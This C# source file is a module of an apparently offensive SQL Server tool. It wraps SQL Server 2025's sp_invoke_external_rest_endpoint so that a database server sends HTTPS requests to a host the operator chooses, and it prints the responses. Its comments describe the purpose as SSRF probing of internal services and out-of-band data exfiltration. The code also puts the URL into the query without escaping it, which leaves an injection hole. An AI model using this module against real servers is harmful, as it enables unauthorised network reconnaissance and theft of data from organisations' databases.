// MSSQLand/Actions/Remote/AiRest.cs

using System;
using System.Data;

using MSSQLand.Services;
using MSSQLand.Utilities;

namespace MSSQLand.Actions.Remote
{
    /// <summary>
    /// Invokes sp_invoke_external_rest_endpoint, the native HTTPS REST client introduced in
    /// SQL Server 2025. Useful for SSRF probing (enumerate internal services reachable by
    /// the SQL Server process) and out-of-band data exfiltration.
    ///
    /// Requires the 'external rest endpoint enabled' sp_configure option.
    /// HTTPS is mandatory; the server enforces TLS and a valid certificate chain.
    /// </summary>
    internal class AiRest : BaseAction
    {
        [ArgumentMetadata(Position = 0, Required = true, ShortName = "u", LongName = "url",
            Description = "HTTPS URL to call (SQL Server enforces TLS)")]
        private string _url = "";

        [ArgumentMetadata(Position = 1, Required = false, ShortName = "m", LongName = "method",
            Description = "HTTP method: GET, POST, PUT, PATCH, DELETE (default: GET)")]
        private string _method = "GET";

        [ArgumentMetadata(Required = false, ShortName = "p", LongName = "payload",
            Description = "JSON payload for POST/PUT/PATCH requests")]
        private string _payload = null;

        [ArgumentMetadata(Required = false, ShortName = "H", LongName = "headers",
            Description = "Additional HTTP headers as a JSON object, e.g. {\"X-Api-Key\":\"secret\"}")]
        private string _headers = null;

        public override void ValidateArguments(string[] args)
        {
            BindArguments(args);

            if (string.IsNullOrWhiteSpace(_url))
                throw new ArgumentException("URL is required.");

            if (!_url.StartsWith("https://", StringComparison.OrdinalIgnoreCase))
                throw new ArgumentException("URL must use HTTPS. SQL Server 2025 only permits TLS for this feature.");

            _method = _method.ToUpperInvariant();

            switch (_method)
            {
                case "GET":
                case "POST":
                case "PUT":
                case "PATCH":
                case "DELETE":
                    break;
                default:
                    throw new ArgumentException($"Unsupported HTTP method '{_method}'. Valid: GET, POST, PUT, PATCH, DELETE.");
            }
        }

        public override object Execute(DatabaseContext databaseContext)
        {
            if (!AiModels.RequiresSql2025(databaseContext)) return null;

            Logger.Info($"Invoking REST endpoint: [{_method}] {_url}");

            string headersClause = string.IsNullOrWhiteSpace(_headers)
                ? ""
                : $"\n    @headers = N'{_headers.Replace("'", "''")}',";

            string payloadClause = string.IsNullOrWhiteSpace(_payload)
                ? ""
                : $"\n    @payload = N'{_payload.Replace("'", "''")}',";

            // The trailing SELECT turns the OUTPUT parameter into a rowset for ExecuteTable.
            string query = $@"DECLARE @resp NVARCHAR(MAX);
EXEC sp_invoke_external_rest_endpoint
    @url      = N'{_url}',
    @method   = '{_method}',{headersClause}{payloadClause}
    @response = @resp OUTPUT;
SELECT @resp AS Response;";

            try
            {
                DataTable result = databaseContext.QueryService.ExecuteTable(query);

                if (result == null || result.Rows.Count == 0 || result.Rows[0]["Response"] == DBNull.Value)
                {
                    Logger.Warning("No response returned");
                    return null;
                }

                string response = result.Rows[0]["Response"].ToString();
                Logger.Success($"Response received ({response.Length} bytes)");
                Logger.NewLine();
                Console.WriteLine(response);

                return response;
            }
            catch (Exception ex)
            {
                string msg = ex.Message;

                if (msg.Contains("not enabled") || msg.Contains("feature is not supported") || msg.Contains("does not exist"))
                    Logger.Error("Feature disabled. Enable with: config \"external rest endpoint enabled\" 1");
                else if (msg.Contains("certificate") || msg.Contains("SSL") || msg.Contains("TLS"))
                    Logger.Error($"TLS/certificate error: {msg}");
                else
                    Logger.Error($"REST call failed: {msg}");

                return null;
            }
        }
    }
}
